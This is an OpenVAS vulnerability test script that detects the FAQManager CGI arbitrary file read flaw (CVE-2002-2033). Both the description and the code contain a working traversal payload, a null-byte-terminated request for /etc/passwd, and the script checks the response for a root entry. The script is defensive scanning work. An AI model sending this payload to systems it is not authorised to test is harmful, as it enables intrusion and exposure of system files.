# OpenVAS Vulnerability Test
# $Id: faqmanager.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: FAQManager Arbitrary File Reading Vulnerability
#
# Authors:
# Matt Moore <matt.moore@westpoint.ltd.uk>
#
# Copyright:
# Copyright (C) 2002 Matt Moore
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "FAQManager is a Perl-based CGI for maintaining a list of 
Frequently asked Questions. Due to poor input validation it is possible to 
use this CGI to view arbitrary files on the web server. For example:

http://www.someserver.com/cgi-bin/faqmanager.cgi?toc=/etc/passwd%00";

tag_solution = "A new version of FAQManager is available at:
www.fourteenminutes.com/code/faqmanager/";

if(description)
{
 script_id(10837);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2002-2033");
 script_bugtraq_id(3810);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 name = "FAQManager Arbitrary File Reading Vulnerability";
 script_name(name);
 
 
 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 
 script_copyright("This script is Copyright (C) 2002 Matt Moore");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("find_service.nasl", "no404.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
port = get_http_port(default:80);

no404 = get_kb_item(string("www/no404/", port));
if (no404) exit(0);

  req = http_get(item:"/cgi-bin/faqmanager.cgi?toc=/etc/passwd%00", port:port);
  r = http_keepalive_send_recv(port:port, data:req);

  if(egrep(pattern: "root:.*:0:[01]:.*", string: r, icase: TRUE)) {
   security_message(port);
   exit(0);
  }